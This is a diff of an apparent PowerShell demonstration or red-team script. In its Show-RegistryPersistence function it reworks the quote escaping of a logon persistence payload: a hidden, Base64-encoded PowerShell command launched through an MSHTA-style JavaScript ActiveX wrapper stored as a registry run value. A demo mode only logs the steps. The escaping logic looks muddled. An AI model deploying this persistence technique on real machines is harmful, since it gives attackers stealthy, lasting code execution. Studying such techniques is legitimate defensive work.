@@ -296,13 +296,20 @@ function Show-RegistryPersistence {
     # Desktop path where the payload will create a marker file on user logon
     $desktopPath = [Environment]::GetFolderPath('Desktop')
 
-    # The entire payload is now a single, clean string.
-    # This string will be Base64 encoded and passed to MSHTA.EXE in memory.
+    # The entire payload is now a single string.
+    # We must ensure any internal quotes are correctly escaped for the JS context.
+    # We escape the entire string with backslashes so it can be used inside
+    # the JS string literal.
     $payload = "powershell.exe -WindowStyle Hidden -EncodedCommand '$encodedPayload'"
-
-    # The JS wrapper which executes the encoded payload string in memory
-    # by using the Windows Script Host Object (which is what MSHTA.EXE does)
-    $runValue = "javascript:var s = new ActiveXObject('Scripting.FileSystemObject'); s.CreateTextFile('powershell.exe', true).Write('$encodedPayload'); new ActiveXObject('Scripting.Shell').Run(\"powershell.exe -WindowStyle Hidden -EncodedCommand '$payload'\")'"
+    
+    # We must escape the single quotes inside the payload string itself,
+    # so that the JS string is valid.
+    $escapedPayload = $payload -replace "'", "''"
+    
+    # The JS wrapper executes the escaped payload string.
+    # We must escape the quotes again because we are placing this JS 
+    # string inside a PowerShell single-quoted string.
+    $runValue = "javascript:var s = new ActiveXObject('Scripting.FileSystemObject'); s.CreateTextFile('powershell.exe', true).Write('$escapedPayload'); new ActiveXObject('Scripting.Shell').Run(\"powershell.exe -WindowStyle Hidden -EncodedCommand '$encodedPayload'\")';"
 
     if ($Global:DemoMode) {
         Write-Host "    [*] Demonstrating registry-based persistence concepts (LOGGING ONLY):" -ForegroundColor Gray
@@ -322,6 +329,7 @@ function Show-RegistryPersistence {
         }
     }
 }
+
 
 
 function Undo-LiveChanges {
